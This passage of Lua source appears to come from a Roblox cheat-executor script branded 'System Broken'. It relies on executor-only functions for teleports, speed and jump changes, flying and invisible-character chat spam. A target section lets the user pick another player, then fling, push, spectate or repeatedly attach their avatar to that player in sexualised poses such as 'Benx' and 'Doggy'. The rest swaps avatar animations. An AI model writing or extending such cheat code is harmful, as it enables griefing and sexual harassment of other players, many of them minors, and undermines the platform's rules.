			pcall(function()
				plr.Character.Humanoid:ChangeState(15)
				task.wait(GetPing())
				fireclickdetector(v.Cannon_Part.ClickDetector)
				plr.CharacterAdded:Wait()
				task.wait(1)
			end)
		end
	end
end)

ChatAlert_Button.MouseButton1Click:Connect(function()
	for i = 1,3 do
		local args = {[1] = "\u{205F}",[2] = "All"}
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
	end
end)

CannonTP1_Button.MouseButton1Click:Connect(function()
	TeleportTO(-61, 34, -228,"pos","safe")
end)

CannonTP2_Button.MouseButton1Click:Connect(function()
	TeleportTO(50, 34, -228,"pos","safe")
end)

CannonTP3_Button.MouseButton1Click:Connect(function()
	TeleportTO(-6, 35, -106,"pos","safe")
end)

MinefieldTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-65, 23, -151,"pos","safe")
end)

BallonTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-118, 23, -126,"pos","safe")
end)

NormalStairsTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-6, 203, -496,"pos","safe")
end)

MovingStairsTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-210, 87, -224,"pos","safe")
end)

SpiralStairsTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(151, 847, -306,"pos","safe")
end)

SkyscraperTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(142, 1033, -192,"pos","safe")
end)

PoolTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-133, 65, -321,"pos","safe")
end)

CMDBar.FocusLost:Connect(function()
	command = CMDBar.Text
	Players:Chat(command)
	SendNotify("System Broken",("Executed "..command),5)
	CMDBar.Text = ""
end)

--CHARACTER SECTION

WalkSpeed_Button.MouseButton1Click:Connect(function()
	pcall(function()
		local Speed = WalkSpeed_Input.Text:gsub("%D", "")
		if Speed == "" then
			Speed = 16
		end
		plr.Character.Humanoid.WalkSpeed = tonumber(Speed)
		SendNotify("System Broken","Walk speed updated.",5)
	end)
end)

JumpPower_Button.MouseButton1Click:Connect(function()
	pcall(function()
		local Power = JumpPower_Input.Text:gsub("%D", "")
		if Power == "" then
			Power = 50
		end
		plr.Character.Humanoid.JumpPower = tonumber(Power)
		SendNotify("System Broken","Jump power updated.",5)
	end)
end)

FlySpeed_Button.MouseButton1Click:Connect(function()
	pcall(function()
		local Speed = FlySpeed_Input.Text:gsub("%D", "")
		if Speed == "" then
			Speed = 50
		end
		FlySpeed = tonumber(Speed)
		SendNotify("System Broken","Fly speed updated.",5)
	end)
end)

Respawn_Button.MouseButton1Click:Connect(function()
	local RsP = GetRoot(plr).Position
	plr.Character.Humanoid.Health = 0
	plr.CharacterAdded:wait(); task.wait(GetPing()+0.1)
	TeleportTO(RsP.X,RsP.Y,RsP.Z,"pos","safe")
end)

SaveCheckpoint_Button.MouseButton1Click:Connect(function()
	SavedCheckpoint = GetRoot(plr).Position
	SendNotify("System Broken","Checkpoint saved.",5)
end)

ClearCheckpoint_Button.MouseButton1Click:Connect(function()
	SavedCheckpoint = nil
	SendNotify("System Broken","Checkpoint cleared.",5)
end)

local flying = true
local deb = true
local ctrl = {f = 0, b = 0, l = 0, r = 0}
local lastctrl = {f = 0, b = 0, l = 0, r = 0}
local KeyDownFunction = nil
local KeyUpFunction = nil
Fly_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(Fly_Button)
	if Fly_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		flying = true
		if game:GetService("UserInputService").TouchEnabled then
			Fly_Pad.Visible = true
		end
		local UpperTorso = plr.Character.UpperTorso
		local speed = 0
		local function Fly()
			local bg = Instance.new("BodyGyro", UpperTorso)
			bg.P = 9e4
			bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			bg.cframe = UpperTorso.CFrame
			local bv = Instance.new("BodyVelocity", UpperTorso)
			bv.velocity = Vector3.new(0,0.1,0)
			bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
			PlayAnim(10714347256,4,0)
			repeat task.wait()
				plr.Character.Humanoid.PlatformStand = true
				if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
					speed = speed+FlySpeed*0.10
					if speed > FlySpeed then
						speed = FlySpeed
					end
				elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
					speed = speed-FlySpeed*0.10
					if speed < 0 then
						speed = 0
					end
				end
				if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
					lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
				elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				else
					bv.velocity = Vector3.new(0,0.1,0)
				end
				bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/FlySpeed),0,0)
			until not flying
			ctrl = {f = 0, b = 0, l = 0, r = 0}
			lastctrl = {f = 0, b = 0, l = 0, r = 0}
			speed = 0
			bg:Destroy()
			bv:Destroy()
			plr.Character.Humanoid.PlatformStand = false
		end

		KeyDownFunction = mouse.KeyDown:connect(function(key)
			if key:lower() == "w" then
				ctrl.f = 1
				PlayAnim(10714177846,4.65,0)
			elseif key:lower() == "s" then
				ctrl.b = -1
				PlayAnim(10147823318,4.11,0)
			elseif key:lower() == "a" then
				ctrl.l = -1
				PlayAnim(10147823318,3.55,0)
			elseif key:lower() == "d" then
				ctrl.r = 1
				PlayAnim(10147823318,4.81,0)
			end
		end)

		KeyUpFunction = mouse.KeyUp:connect(function(key)
			if key:lower() == "w" then
				ctrl.f = 0
				PlayAnim(10714347256,4,0)
			elseif key:lower() == "s" then
				ctrl.b = 0
				PlayAnim(10714347256,4,0)
			elseif key:lower() == "a" then
				ctrl.l = 0
				PlayAnim(10714347256,4,0)
			elseif key:lower() == "d" then
				ctrl.r = 0
				PlayAnim(10714347256,4,0)
			end
		end)
		Fly()
	else
		flying = false
		Fly_Pad.Visible = false
		KeyDownFunction:Disconnect()
		KeyUpFunction:Disconnect()
		StopAnim()
	end
end)

FlyAButton.MouseButton1Down:Connect(function()
	keypress("0x41")
end)
FlyAButton.MouseButton1Up:Connect(function ()
	keyrelease("0x41")
end)

FlySButton.MouseButton1Down:Connect(function()
	keypress("0x53")
end)
FlySButton.MouseButton1Up:Connect(function ()
	keyrelease("0x53")
end)

FlyDButton.MouseButton1Down:Connect(function()
	keypress("0x44")
end)
FlyDButton.MouseButton1Up:Connect(function ()
	keyrelease("0x44")
end)

FlyWButton.MouseButton1Down:Connect(function()
	keypress("0x57")
end)
FlyWButton.MouseButton1Up:Connect(function ()
	keyrelease("0x57")
end)

--TARGET
ClickTargetTool_Button.MouseButton1Click:Connect(function()
	local GetTargetTool = Instance.new("Tool")
	GetTargetTool.Name = "ClickTarget"
	GetTargetTool.RequiresHandle = false
	GetTargetTool.TextureId = "rbxassetid://2716591855"
	GetTargetTool.ToolTip = "Select Target"

	local function ActivateTool()
		local root = GetRoot(plr)
		local hit = mouse.Target
		local person = nil
		if hit and hit.Parent then
			if hit.Parent:IsA("Model") then
				person = game.Players:GetPlayerFromCharacter(hit.Parent)
			elseif hit.Parent:IsA("Accessory") then
				person = game.Players:GetPlayerFromCharacter(hit.Parent.Parent)
			end
			if person then
				UpdateTarget(person)
			end
		end
	end

	GetTargetTool.Activated:Connect(function()
		ActivateTool()
	end)
	GetTargetTool.Parent = plr.Backpack
end)

FlingTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(FlingTarget_Button)
		if FlingTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			if TouchFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0) then
				ChangeToggleColor(TouchFling_Button)
			end
			local OldPos = GetRoot(plr).Position
			ToggleFling(true)
			repeat task.wait()
				pcall(function()
					PredictionTP(Players[TargetedPlayer],"safe")
				end)
				task.wait()
			until FlingTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			TeleportTO(OldPos.X,OldPos.Y,OldPos.Z,"pos","safe")
		else
			ToggleFling(false)
		end
	end
end)

ViewTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(ViewTarget_Button)
		if ViewTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			repeat
				pcall(function()
					game.Workspace.CurrentCamera.CameraSubject = Players[TargetedPlayer].Character.Humanoid
				end)
				task.wait(0.5)
			until ViewTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			game.Workspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
		end
	end
end)

FocusTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(FocusTarget_Button)
		if FocusTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			repeat
				pcall(function()
					local target = Players[TargetedPlayer]
					TeleportTO(0,0,0,target)
					Push(Players[TargetedPlayer])
				end)
				task.wait(0.2)
			until FocusTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
		end
	end
end)

BenxTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(BenxTarget_Button)
		if BenxTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			PlayAnim(5918726674,0,1)
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local otherRoot = GetRoot(Players[TargetedPlayer])
					GetRoot(plr).CFrame = otherRoot.CFrame * CFrame.new(0,0,1.1)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until BenxTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			StopAnim()
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

HeadsitTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(HeadsitTarget_Button)
		if HeadsitTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local targethead = Players[TargetedPlayer].Character.Head
					plr.Character.Humanoid.Sit = true
					GetRoot(plr).CFrame = targethead.CFrame * CFrame.new(0,2,0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until HeadsitTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

StandTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(StandTarget_Button)
		if StandTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			PlayAnim(13823324057,4,0)
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local root = GetRoot(Players[TargetedPlayer])
					GetRoot(plr).CFrame = root.CFrame * CFrame.new(-3,1,0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until StandTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			StopAnim()
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

BackpackTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(BackpackTarget_Button)
		if BackpackTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local root = GetRoot(Players[TargetedPlayer])
					plr.Character.Humanoid.Sit = true
					GetRoot(plr).CFrame = root.CFrame * CFrame.new(0,0,1.2) * CFrame.Angles(0, -3, 0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until BackpackTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

DoggyTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(DoggyTarget_Button)
		if DoggyTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			PlayAnim(13694096724,3.4,0)
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local root = Players[TargetedPlayer].Character.LowerTorso
					GetRoot(plr).CFrame = root.CFrame * CFrame.new(0,0.23,0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until DoggyTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			StopAnim()
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

DragTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(DragTarget_Button)
		if DragTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			PlayAnim(10714360343,0.5,0)
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local root = Players[TargetedPlayer].Character.RightHand
					GetRoot(plr).CFrame = root.CFrame * CFrame.new(0,-2.5,1) * CFrame.Angles(-2, -3, 0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until DragTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			StopAnim()
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

PushTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		local pushpos = GetRoot(plr).CFrame
		PredictionTP(Players[TargetedPlayer])
		task.wait(GetPing()+0.05)
		Push(Players[TargetedPlayer])
		GetRoot(plr).CFrame = pushpos
	end
end)

TeleportTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		TeleportTO(0,0,0,Players[TargetedPlayer],"safe")
	end
end)

WhitelistTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		if table.find(ScriptWhitelist, Players[TargetedPlayer].UserId) then
			for i,v in pairs(ScriptWhitelist) do
				if v == Players[TargetedPlayer].UserId then
					table.remove(ScriptWhitelist, i)
				end
			end
			SendNotify("System Broken",TargetedPlayer.." removed from whitelist.",5)
		else
			table.insert(ScriptWhitelist, Players[TargetedPlayer].UserId)
			SendNotify("System Broken",TargetedPlayer.." added to whitelist.", 5)
		end
	end
end)

TargetName_Input.FocusLost:Connect(function()
	local LabelText = TargetName_Input.Text
	local LabelTarget = GetPlayer(LabelText)
	UpdateTarget(LabelTarget)
end)

--ANIMATIONS

VampireAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

HeroAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

ZombieClassicAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

MageAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

GhostAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

ElderAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

LevitationAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

AstronautAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

NinjaAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

WerewolfAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

CartoonAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

PirateAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

SneakyAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

ToyAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

KnightAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

--NEWS
ConfidentAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1069977950"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1070017263"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1070001516"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

PopstarAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980338"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980348"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1212954642"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1213044953"
